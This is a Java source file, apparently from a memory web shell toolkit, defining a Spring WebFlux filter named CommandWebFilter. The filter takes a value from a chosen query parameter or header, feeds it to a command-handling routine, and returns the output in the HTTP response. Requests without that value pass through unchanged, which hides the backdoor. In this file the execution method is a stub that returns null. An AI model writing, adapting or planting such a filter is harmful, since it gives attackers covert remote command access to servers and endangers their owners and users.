package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandWebFilter implements WebFilter {
    public static String paramName;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String p = exchange.getRequest().getQueryParams().getFirst(paramName);
        if (p == null || p.isEmpty()) {
            p = exchange.getRequest().getHeaders().getFirst(paramName);
        }
        if (p == null) {
            return chain.filter(exchange);
        }
        String param = getParam(p);
        String result = "";
        try {
            InputStream inputStream = getInputStream(param);
            result = new Scanner(inputStream).useDelimiter("\\A").next();
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return exchange.getResponse().writeWith(Mono.just(new DefaultDataBufferFactory().wrap(result.getBytes(StandardCharsets.UTF_8))));
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
